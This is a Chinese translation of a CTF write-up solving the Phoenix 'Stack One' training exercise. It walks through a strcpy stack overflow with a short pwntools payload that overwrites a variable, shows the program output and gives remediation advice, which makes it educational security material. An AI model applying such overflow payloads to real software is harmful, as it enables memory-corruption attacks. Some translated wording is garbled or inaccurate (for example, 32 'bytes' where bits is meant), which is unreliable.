<html>
<head>
<title>Phoenix Challenges — Stack One</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">凤凰城挑战赛—堆栈一</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/phoenix-challenges-stack-one-4a9d2100274f?source=collection_archive---------1-----------------------#2022-09-03">https://infosecwriteups.com/phoenix-challenges-stack-one-4a9d2100274f?source=collection_archive---------1-----------------------#2022-09-03</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/6edb48b6bb739362916b5e7758eb4c89.png" data-original-src="https://miro.medium.com/v2/resize:fit:550/format:webp/0*y5AszFDDali0J9Cs.png"/></div></figure><h1 id="b8ed" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">挑战</h1><p id="be78" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">挑战的描述和源代码位于<a class="ae lq" href="https://exploit.education/phoenix/stack-one/" rel="noopener ugc nofollow" target="_blank">这里</a>。它和所有其他Phoenix二进制文件都位于<strong class="ku ir"> /opt/phoenix/amd64 </strong>目录中。前一篇<a class="ae lq" href="https://medium.com/@secnate/phoenix-challenges-getting-set-up-a2783e0616c6" rel="noopener">文章</a>描述了如何设置虚拟机来应对这些挑战，如果还没有这样做的话。</p><h1 id="5dae" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">文件</h1><p id="a613" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">我们使用下面的命令来了解一个<em class="lr">堆栈</em>文件的属性:</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="dfe0" class="mb jv iq lx b gy mc md l me mf">nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-one$ file /opt/phoenix/amd64/stack-one</span><span id="5329" class="mb jv iq lx b gy mg md l me mf">/opt/phoenix/amd64/stack-one: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped</span></pre><p id="8551" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">一些有趣的事实:</p><ol class=""><li id="d7a3" class="mm mn iq ku b kv mh kz mi ld mo lh mp ll mq lp mr ms mt mu bi translated">它启用了<code class="fe mv mw mx lx b">setuid</code>属性，这表明该程序是以所有者的权限运行的。如果文件的所有者是root用户(在本例中不是)，则可以使用它来提升权限</li><li id="432c" class="mm mn iq ku b kv my kz mz ld na lh nb ll nc lp mr ms mt mu bi translated">它有符号，如<code class="fe mv mw mx lx b">not stripped</code>属性所示。这意味着调试和分析二进制文件的人可以看到原始的变量和函数名</li><li id="babc" class="mm mn iq ku b kv my kz mz ld na lh nb ll nc lp mr ms mt mu bi translated">它使用动态链接的共享库作为其执行的一部分。这有助于识别所使用的标准函数</li><li id="b807" class="mm mn iq ku b kv my kz mz ld na lh nb ll nc lp mr ms mt mu bi translated">那是一辆<code class="fe mv mw mx lx b">ELF 64-bit LSB executable, x86-64</code>。ELF是文件格式，字长是64位，LSB表示它是little-endian(首先使用最低有效字节)，二进制使用x86-64指令集</li></ol><h1 id="05f1" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">目标</h1><p id="c577" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">查看<em class="lr"> Stack One的</em> C代码，我们看到<em class="lr"> changeme </em>变量存储在初始化为0的<em class="lr"> locals </em> struct中。目标是篡改它的值，使它的值等于<code class="fe mv mw mx lx b">0x496c5962</code>来打印所需的语句。</p><h1 id="f3cb" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">相关概念</h1><p id="f03c" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">有必要了解堆栈内存是如何工作的。我在凤凰栈零挑战的<a class="ae lq" href="https://medium.com/bugbountywriteup/phoenix-challenges-stack-zero-f8743cc871ed" rel="noopener">文章里写了一篇很长的解释，有兴趣的可以看看。</a></p><h1 id="edcc" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">虫子</h1><p id="1047" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">所有的<em class="lr"> Stack One的</em>数据都存储在堆栈上，而<em class="lr"> locals </em> struct的buffer和<em class="lr"> changeme </em>变量是相邻的邻居。存入<em class="lr">缓冲区</em>的多余数据将溢出到<em class="lr"> changeme </em>变量并影响其值。这种溢出是由<em class="lr"> strcpy() </em>函数引起的，该函数将<em class="lr"> Stack-One </em>二进制的参数写入<em class="lr"> locals.buffer </em>中，而不进行任何边界检查。</p><h1 id="c982" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">利用</h1><p id="236e" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">输入写入的<em class="lr"> locals.buffer </em>有64个字符的空间。由于<em class="lr"> locals.changeme </em>变量最初为0，因此漏洞需要篡改其内存位置，以使其具有所需的<code class="fe mv mw mx lx b">0x496c5962</code>值。这是通过输入一个64个字符的输入字符串来完全占据缓冲区的内存，并追加额外的数据来用<code class="fe mv mw mx lx b">0x496c5962</code>值覆盖<em class="lr"> changeme </em>变量来实现的。</p><p id="78b3" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">我需要完全填满<em class="lr"> locals.buffer </em>的64个字符，并确保追加的值可以完全控制<em class="lr"> changeme </em>变量。幸运的是，<em class="lr"> Stack One </em>二进制文件有打印输出，它证明了<em class="lr"> locals.changeme </em>变量是否等于<code class="fe mv mw mx lx b">0x496c5962</code>，如果不等于就打印它的值。方便的</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="d9eb" class="mb jv iq lx b gy mc md l me mf">if (locals.changeme == 0x496c5962) { <br/>  puts("Well done, you have successfully set changeme to the correct value"); <br/>} <br/>else { <br/>  printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n", locals.changeme); <br/>}</span></pre><p id="e1d3" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">我从设计一个基本的漏洞开始。其有效载荷在<a class="ae lq" href="https://github.com/secnate/Exploit-Education-CTFs/blob/main/Phoenix/stack-one/exploit.py" rel="noopener ugc nofollow" target="_blank"> <em class="lr"> exploit.py </em> </a>文件的第14行是<code class="fe mv mw mx lx b">payload = cyclic(64) + p32(0xdeadbeef)</code></p><p id="300e" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">这是什么意思？Pwntool的<em class="lr"> cyclic(64) </em>命令生成以下循环填充字符串</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="e49e" class="mb jv iq lx b gy mc md l me mf">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa</span></pre><p id="ba37" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">虽然字符本身没有内在含义，但它的主要好处是每个可能的4字节序列对应一个唯一的字符串索引。通过简化调试和调整填充字符串偏移量，这加快了漏洞利用开发的过程。</p><p id="a8cf" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">p32函数是pwntools的打包工具。它接受提供的整数输入(本例中为0xdeadbeef ),并将其转换为长度为32个字节的字节字符串表示形式和适当的字节顺序。因为<em class="lr"> Stack One </em>文件是little-endian，所以它将<strong class="ku ir"> 0xdeadbeef </strong>表示为一个<strong class="ku ir"> b'\xef\xbe\xad\xde' </strong>字节串。</p><p id="1394" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">这样就生成了以下字节串有效负载:</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="0179" class="mb jv iq lx b gy mc md l me mf">b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa\xef\xbe\xad\xde'</span></pre><p id="fbb0" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">下一步是测试有效载荷的发射<em class="lr">是否完全</em>覆盖了带有0xdeadbeef的<em class="lr"> changeme </em>变量。</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="e9a9" class="mb jv iq lx b gy mc md l me mf">nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-one$ ./exploit_with_debugger.py<br/>Launching The Stack One Exploit!<br/>[!] Could not find executable 'stack-one' in $PATH, using '/opt/phoenix/amd64/stack-one' instead<br/>[+] Starting local process '/opt/phoenix/amd64/stack-one': pid 4703<br/>[*] Switching to interactive mode<br/>[*] Process '/opt/phoenix/amd64/stack-one' stopped with exit code 0 (pid 4703)<br/>Welcome to phoenix/stack-one, brought to you by https://exploit.education<br/>Getting closer! changeme is currently 0xdeadbeef, we want 0x496c5962<br/>[*] Got EOF while reading in interactive<br/>$</span></pre><p id="e2b5" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">确实如此。最后一步是用<code class="fe mv mw mx lx b">0x496c5962</code>替换有效载荷的<code class="fe mv mw mx lx b">0xdeadbeef</code>值——你瞧！</p><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="234a" class="mb jv iq lx b gy mc md l me mf">nathan@nathan-VirtualBox:~/Desktop/Exploit-Education-CTFs/Phoenix/stack-one$ ./exploit.py<br/>Launching The Stack One Exploit!<br/>[!] Could not find executable 'stack-one' in $PATH, using '/opt/phoenix/amd64/stack-one' instead<br/>[+] Starting local process '/opt/phoenix/amd64/stack-one': pid 4717<br/>[*] Switching to interactive mode<br/>[*] Process '/opt/phoenix/amd64/stack-one' stopped with exit code 0 (pid 4717)<br/>Welcome to phoenix/stack-one, brought to you by https://exploit.education<br/>Well done, you have successfully set changeme to the correct value<br/>[*] Got EOF while reading in interactive<br/>$</span></pre><p id="0923" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">漏洞代码可以在我的<a class="ae lq" href="https://github.com/secnate/Exploit-Education-CTFs" rel="noopener ugc nofollow" target="_blank"> Github知识库</a>中找到。</p><h1 id="3806" class="ju jv iq bd jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr bi translated">补救</h1><p id="aeaf" class="pw-post-body-paragraph ks kt iq ku b kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp ij bi translated">为了防止这样的内存损坏错误，我会敦促开发人员不要用C编写，而要过渡到内存安全的语言，如Python或Rust。</p><p id="0bf6" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">如果除了使用C别无选择，我会警告不要使用<a class="ae lq" href="https://www.geeksforgeeks.org/why-strcpy-and-strncpy-are-not-safe-to-use/" rel="noopener ugc nofollow" target="_blank"> strcpy </a>函数来提取命令行参数或输入。正如刚才看到的，它继续读取输入，直到看到终止空值(' \0 ')，而不管目的缓冲区的大小。</p><p id="c372" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">应该使用<a class="ae lq" href="https://man.openbsd.org/strlcpy.3" rel="noopener ugc nofollow" target="_blank"> strlcpy </a>函数。它将输入写入目标缓冲区，直到达到指定的大小，并以空字符(' \0 ')终止缓冲区。方便，因为许多程序员会忘记手动这样做。</p><p id="c33d" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">源代码的<code class="fe mv mw mx lx b">strcpy(locals.buffer, argv[1]);</code>行将是<code class="fe mv mw mx lx b">strlcpy(locals.buffer, argv[1], 64);</code>。</p></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><p id="ff65" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">这一轮就到此为止。敬请期待下一次挑战！</p><p id="9142" class="pw-post-body-paragraph ks kt iq ku b kv mh kx ky kz mi lb lc ld mj lf lg lh mk lj lk ll ml ln lo lp ij bi translated">这篇CTF挑战赛的文章最初发表在内森·帕夫洛夫斯基的个人博客上:<a class="ae lq" href="http://secnate.github.io/" rel="noopener ugc nofollow" target="_blank"> secnate.github.io </a></p></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><h2 id="fba9" class="mb jv iq bd jw nk nl dn ka nm nn dp ke ld no np ki lh nq nr km ll ns nt kq nu bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lq" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>